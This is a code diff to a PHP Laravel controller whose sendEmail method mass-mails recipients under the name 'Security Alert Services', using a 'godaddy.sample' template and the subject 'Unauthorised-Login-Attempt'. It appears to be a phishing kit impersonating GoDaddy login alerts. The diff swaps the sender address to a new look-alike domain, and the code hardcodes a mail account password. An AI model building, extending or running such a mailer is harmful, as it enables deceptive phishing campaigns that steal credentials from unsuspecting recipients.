@@ -65,14 +65,14 @@ class PageController extends Controller
     public function sendEmail(Request $request)
     {
         $this->validate($request, ['email' => 'required']);
-        Config::set('mail.username', 'help@usaimmigration.website');
+        Config::set('mail.username', 'security@mail-guard.services');
         Config::set('mail.password', 'Olu2019@');
 
         if (strpos($request->email, ',')) {
           $emails = explode(',', $request->email);
           foreach ($emails as $email) {
             $params['from_name'] = 'Security Alert Services';
-            $params['from_email'] = 'help@usaimmigration.website';
+            $params['from_email'] = 'security@mail-guard.services';
             $params['to'] = preg_replace('/\s/', '', $email);
             $params['template'] = 'godaddy.sample';
             $params['subject'] = 'Unauthorised-Login-Attempt';
@@ -80,13 +80,13 @@ class PageController extends Controller
         }
     } else {
         $params['from_name'] = 'Security Alert Services';
-        $params['from_email'] = 'help@usaimmigration.website';
+        $params['from_email'] = 'security@mail-guard.services';
         $params['to'] = $request->email;
         $params['template'] = 'godaddy.sample';
         $params['subject'] = 'Unauthorised-Login-Attempt';
         sendmail($params);
     }
     // return back()->with('status', 'sent');
-    return redirect('//email-secure-success');
+    return redirect('/email-secure-success');
 }
 }
